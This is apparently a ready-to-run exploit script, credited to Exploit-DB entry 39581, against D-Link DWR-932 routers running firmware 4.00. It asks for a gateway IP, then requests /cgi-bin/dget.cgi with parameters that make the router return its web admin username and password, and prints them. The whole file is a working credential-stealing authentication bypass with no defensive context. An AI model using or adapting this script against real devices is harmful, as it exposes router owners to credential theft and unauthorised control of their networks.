/**
* Title: D-Link DWR-932 Firmware 4.00 - Authentication Bypass
* Discovered by: Saeed reza Zamanian
* Exploit from https://www.exploit-db.com/exploits/39581/
*/

load "http/curl"

print "D-Link DWR-932 Firmware 4.00 Authentication Bypass\n"

print "IP Gateway: "
input.start()
    @gateway = input.value
    @exploit = "/cgi-bin/dget.cgi?cmd=DEVICE_web_usrname,DEVICE_web_passwd,DEVICE_login_timeout&_=1458459188807"
    @result = curl.get(@gateway, @exploit)
    
    print "Username: " . @result['DEVICE_web_usrname']
    print "\nPassword: " . @result['DEVICE_web_passwd']
input.close()
